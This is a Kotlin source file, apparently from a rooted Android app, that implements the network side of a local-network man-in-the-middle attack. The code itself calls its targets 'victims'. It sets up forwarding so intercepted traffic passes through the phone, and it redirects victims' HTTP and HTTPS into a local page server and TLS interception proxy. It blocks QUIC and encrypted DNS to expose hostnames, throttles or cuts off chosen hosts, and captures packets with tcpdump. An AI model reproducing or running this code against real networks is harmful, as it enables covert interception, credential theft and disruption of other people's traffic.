package com.winarp.mobile.net

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

/**
 * Root-backed network plumbing for a transparent MITM and live traffic view.
 *
 * On Android the FORWARD chain ends in a tethering DROP and the default route lives in the
 * per-interface policy table (not `main`), so a poisoned victim just loses internet even with
 * `ip_forward=1`. [enableForwarding] fixes all of that so the victim keeps internet and its
 * traffic transits this device; [disableForwarding] reverts it. [spawnCapture] streams tcpdump.
 */
object RootNet {

    /** Turn this device into a working L3 forwarder for traffic entering on [ifName]. null = ok. */
    suspend fun enableForwarding(ifName: String): String? = withContext(Dispatchers.IO) {
        val script = buildString {
            append("sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1 || echo 1 > /proc/sys/net/ipv4/ip_forward; ")
            append("sysctl -w net.ipv4.conf.all.send_redirects=0 >/dev/null 2>&1; ")
            append("sysctl -w net.ipv4.conf.$ifName.send_redirects=0 >/dev/null 2>&1; ")
            append("sysctl -w net.ipv4.conf.$ifName.rp_filter=2 >/dev/null 2>&1; ")
            append("sysctl -w net.ipv4.conf.all.rp_filter=2 >/dev/null 2>&1; ")
            // accept intra-interface forwarding before Android's tetherctrl DROP
            append("iptables -C FORWARD -i $ifName -o $ifName -j ACCEPT 2>/dev/null || iptables -I FORWARD 1 -i $ifName -o $ifName -j ACCEPT; ")
            // forwarded packets must use the interface's routing table (it has the default route)
            append("ip rule list | grep -q \"iif $ifName lookup $ifName\" || ip rule add iif $ifName lookup $ifName priority 9000; ")
            append("echo DONE")
        }
        val (code, out) = RootHelper.execSu(script)
        if (out.contains("DONE") && code == 0) null
        else out.trim().ifBlank { "forwarding setup failed (code=$code)" }
    }

    /** Undo [enableForwarding]. Best-effort; ignores errors. */
    suspend fun disableForwarding(ifName: String) {
        val script = buildString {
            append("iptables -D FORWARD -i $ifName -o $ifName -j ACCEPT 2>/dev/null; ")
            append("ip rule del iif $ifName lookup $ifName priority 9000 2>/dev/null; ")
            append("echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null; ")
            append("echo DONE")
        }
        RootHelper.execSu(script)
    }

    /**
     * Declaratively apply per-host traffic controls (bandwidth cap + latency/loss via tc, block +
     * :80 proxy via iptables). Full rebuild each call so state can't drift. All forwarded victim
     * traffic egresses [ifName] (victim and router share it), so both directions are shaped there
     * by matching dst=host (download) and src=host (upload) — no ingress/ifb needed. null = ok.
     */
    suspend fun applyControls(
        ifName: String,
        controls: Map<String, com.winarp.mobile.data.HostControl>,
        proxyPort: Int,
        tlsPort: Int
    ): String? = withContext(Dispatchers.IO) {
        val sb = StringBuilder()
        sb.append("tc qdisc del dev $ifName root 2>/dev/null; ")
        sb.append("iptables -F WINARP_CTL 2>/dev/null; iptables -t nat -F WINARP_NAT 2>/dev/null; ")
        sb.append("iptables -N WINARP_CTL 2>/dev/null; iptables -C FORWARD -j WINARP_CTL 2>/dev/null || iptables -I FORWARD 1 -j WINARP_CTL; ")
        sb.append("iptables -t nat -N WINARP_NAT 2>/dev/null; iptables -t nat -C PREROUTING -j WINARP_NAT 2>/dev/null || iptables -t nat -I PREROUTING 1 -j WINARP_NAT; ")

        val active = controls.filterValues { it.active }
        val shaped = active.filterValues { it.shaped }
        if (shaped.isNotEmpty()) {
            sb.append("tc qdisc add dev $ifName root handle 1: htb default 999; ")
            sb.append("tc class add dev $ifName parent 1: classid 1:999 htb rate 1000mbit; ")
            for ((ip, c) in shaped) {
                val oct = ip.substringAfterLast('.').toIntOrNull() ?: continue
                val rate = if (c.kbps > 0) c.kbps else 1000000
                val netem = if (c.delayMs > 0 || c.lossPct > 0) "delay ${c.delayMs}ms loss ${c.lossPct}%" else ""
                for ((cid, dir) in listOf((100 + oct) to "dst", (500 + oct) to "src")) {
                    sb.append("tc class add dev $ifName parent 1: classid 1:$cid htb rate ${rate}kbit ceil ${rate}kbit; ")
                    if (netem.isNotEmpty()) sb.append("tc qdisc add dev $ifName parent 1:$cid handle $cid: netem $netem; ")
                    sb.append("tc filter add dev $ifName parent 1: protocol ip prio 1 u32 match ip $dir $ip/32 flowid 1:$cid; ")
                }
            }
        }
        for ((ip, c) in active) {
            if (c.blocked) {
                sb.append("iptables -A WINARP_CTL -i $ifName -s $ip -j DROP; ")
                sb.append("iptables -A WINARP_CTL -i $ifName -d $ip -j DROP; ")
            }
            if (c.proxied) {
                sb.append("iptables -t nat -A WINARP_NAT -i $ifName -s $ip -p tcp --dport 80 -j REDIRECT --to-ports $proxyPort; ")
                sb.append("iptables -t nat -A WINARP_NAT -i $ifName -s $ip -p tcp --dport 443 -j REDIRECT --to-ports $tlsPort; ")
                // Kill the escape hatches so HTTPS is FORCED through the TCP REDIRECT above:
                //   QUIC (HTTP/3, UDP/443) — else modern apps bypass the TLS proxy entirely
                //   DoT (853) — else DNS stays encrypted and we can't see/log hostnames
                sb.append("iptables -A WINARP_CTL -i $ifName -s $ip -p udp --dport 443 -j REJECT; ")
                sb.append("iptables -A WINARP_CTL -i $ifName -s $ip -p udp --dport 853 -j REJECT; ")
                sb.append("iptables -A WINARP_CTL -i $ifName -s $ip -p tcp --dport 853 -j REJECT; ")
            }
        }
        sb.append("echo DONE")
        val (code, out) = RootHelper.execSu(sb.toString())
        if (out.contains("DONE") && code == 0) null else out.trim().ifBlank { "controls failed (code=$code)" }
    }

    /**
     * Fire-and-forget revert of EVERY root change (tc, our iptables chains, forwarding, redirects,
     * DoT/QUIC blocks). Detached so it still runs while the app process is being destroyed
     * (auto-restore on close). Not suspend on purpose.
     */
    fun revertAllDetached(ifName: String, port: Int) {
        val script = buildString {
            append("tc qdisc del dev $ifName root 2>/dev/null; ")
            append("iptables -F WINARP_CTL 2>/dev/null; iptables -D FORWARD -j WINARP_CTL 2>/dev/null; iptables -X WINARP_CTL 2>/dev/null; ")
            append("iptables -t nat -F WINARP_NAT 2>/dev/null; iptables -t nat -D PREROUTING -j WINARP_NAT 2>/dev/null; iptables -t nat -X WINARP_NAT 2>/dev/null; ")
            append("iptables -D FORWARD -i $ifName -o $ifName -j ACCEPT 2>/dev/null; ")
            append("ip rule del iif $ifName lookup $ifName priority 9000 2>/dev/null; ")
            append("iptables -t nat -D PREROUTING -i $ifName -p tcp --dport 80 -j REDIRECT --to-ports $port 2>/dev/null; ")
            append("iptables -t nat -D PREROUTING -i $ifName -p tcp --dport 443 -j REDIRECT --to-ports 8443 2>/dev/null; ")
            append("iptables -D FORWARD -i $ifName -p udp --dport 443 -j REJECT 2>/dev/null; ")
            append("iptables -D FORWARD -i $ifName -p udp --dport 853 -j REJECT 2>/dev/null; ")
            append("iptables -D FORWARD -i $ifName -p tcp --dport 853 -j REJECT 2>/dev/null; ")
            append("echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
        }
        try {
            ProcessBuilder("su", "-c", script).start()
        } catch (_: Throwable) {
        }
    }

    /** Start byte accounting for one host's forwarded traffic (both directions) — for a live meter. */
    suspend fun meterOn(ifName: String, ip: String) {
        RootHelper.execSu(
            "iptables -N WINARP_METER 2>/dev/null; iptables -C FORWARD -j WINARP_METER 2>/dev/null || iptables -I FORWARD 1 -j WINARP_METER; " +
                "iptables -F WINARP_METER; " +
                "iptables -A WINARP_METER -i $ifName -s $ip; " +
                "iptables -A WINARP_METER -i $ifName -d $ip; echo DONE"
        )
    }

    /** Total bytes counted so far for [ip] (up + down). */
    suspend fun readMeterBytes(ip: String): Long = withContext(Dispatchers.IO) {
        val (_, out) = RootHelper.execSu("iptables -L WINARP_METER -v -n -x 2>/dev/null")
        var total = 0L
        for (raw in out.lineSequence()) {
            if (!raw.contains(ip)) continue
            val m = Regex("""^\s*\d+\s+(\d+)\s""").find(raw) ?: continue
            total += m.groupValues[1].toLongOrNull() ?: 0L
        }
        total
    }

    suspend fun meterOff() {
        RootHelper.execSu(
            "iptables -F WINARP_METER 2>/dev/null; iptables -D FORWARD -j WINARP_METER 2>/dev/null; iptables -X WINARP_METER 2>/dev/null; echo DONE"
        )
    }

    /** Remove all per-host controls (tc + iptables chains). */
    suspend fun clearControls(ifName: String) {
        RootHelper.execSu(
            "tc qdisc del dev $ifName root 2>/dev/null; " +
                "iptables -F WINARP_CTL 2>/dev/null; iptables -D FORWARD -j WINARP_CTL 2>/dev/null; iptables -X WINARP_CTL 2>/dev/null; " +
                "iptables -t nat -F WINARP_NAT 2>/dev/null; iptables -t nat -D PREROUTING -j WINARP_NAT 2>/dev/null; iptables -t nat -X WINARP_NAT 2>/dev/null; echo DONE"
        )
    }

    /** Transparently REDIRECT forwarded victim HTTP (:80) into the local page server on [port]. */
    suspend fun enableHttpRedirect(ifName: String, port: Int): String? = withContext(Dispatchers.IO) {
        val script =
            "iptables -t nat -C PREROUTING -i $ifName -p tcp --dport 80 -j REDIRECT --to-ports $port 2>/dev/null || " +
                "iptables -t nat -I PREROUTING 1 -i $ifName -p tcp --dport 80 -j REDIRECT --to-ports $port; echo DONE"
        val (code, out) = RootHelper.execSu(script)
        if (out.contains("DONE") && code == 0) null else out.trim().ifBlank { "http redirect failed (code=$code)" }
    }

    suspend fun disableHttpRedirect(ifName: String, port: Int) {
        RootHelper.execSu(
            "iptables -t nat -D PREROUTING -i $ifName -p tcp --dport 80 -j REDIRECT --to-ports $port 2>/dev/null; echo DONE"
        )
    }

    /** Transparently REDIRECT ALL forwarded victim HTTPS (:443) into the local TLS MITM on [port]. */
    suspend fun enableHttpsRedirect(ifName: String, port: Int): String? = withContext(Dispatchers.IO) {
        val script =
            "iptables -t nat -C PREROUTING -i $ifName -p tcp --dport 443 -j REDIRECT --to-ports $port 2>/dev/null || " +
                "iptables -t nat -I PREROUTING 1 -i $ifName -p tcp --dport 443 -j REDIRECT --to-ports $port; echo DONE"
        val (code, out) = RootHelper.execSu(script)
        if (out.contains("DONE") && code == 0) null else out.trim().ifBlank { "https redirect failed (code=$code)" }
    }

    suspend fun disableHttpsRedirect(ifName: String, port: Int) {
        RootHelper.execSu(
            "iptables -t nat -D PREROUTING -i $ifName -p tcp --dport 443 -j REDIRECT --to-ports $port 2>/dev/null; echo DONE"
        )
    }

    // proto/port pairs blocked to force cleartext: QUIC (recovers TCP TLS + SNI) and DoT (recovers plaintext DNS)
    private val plaintextRules = listOf("udp" to 443, "udp" to 853, "tcp" to 853)

    /**
     * Force victims onto cleartext resolvers/transports by rejecting DoT (853) and QUIC (UDP/443)
     * on forwarded traffic, so DNS (port 53) and TLS SNI become visible. Rules are inserted above
     * the MITM ACCEPT so they take precedence. Reverts when [enable] is false. null = ok.
     */
    suspend fun forcePlaintext(ifName: String, enable: Boolean): String? = withContext(Dispatchers.IO) {
        val sb = StringBuilder()
        for ((proto, port) in plaintextRules) {
            if (enable) {
                sb.append("iptables -C FORWARD -i $ifName -p $proto --dport $port -j REJECT 2>/dev/null || ")
                sb.append("iptables -I FORWARD 1 -i $ifName -p $proto --dport $port -j REJECT 2>/dev/null || ")
                sb.append("iptables -I FORWARD 1 -i $ifName -p $proto --dport $port -j DROP; ")
            } else {
                sb.append("iptables -D FORWARD -i $ifName -p $proto --dport $port -j REJECT 2>/dev/null; ")
                sb.append("iptables -D FORWARD -i $ifName -p $proto --dport $port -j DROP 2>/dev/null; ")
            }
        }
        sb.append("echo DONE")
        val (code, out) = RootHelper.execSu(sb.toString())
        if (out.contains("DONE") && code == 0) null else out.trim().ifBlank { "plaintext rules failed (code=$code)" }
    }

    /**
     * Start a live tcpdump on [ifName], optionally filtered to a single [host].
     * The caller reads the process stdout line by line and MUST destroy the process to stop.
     * Returns null if tcpdump could not be launched (missing binary / no root).
     */
    fun spawnCapture(ifName: String, host: String?): Process? {
        val filter = if (host.isNullOrBlank()) "not arp" else "host $host and not arp"
        return spawnCaptureRaw(ifName, filter)
    }

    /** Launch tcpdump with an arbitrary BPF [filter]. Caller reads stdout and destroys to stop. */
    fun spawnCaptureRaw(ifName: String, filter: String): Process? {
        val cmd = "/system/bin/tcpdump -i $ifName -n -l -q -s 0 $filter 2>&1"
        return try {
            ProcessBuilder("su", "-c", cmd)
                .redirectErrorStream(true)
                .start()
        } catch (_: Throwable) {
            null
        }
    }
}
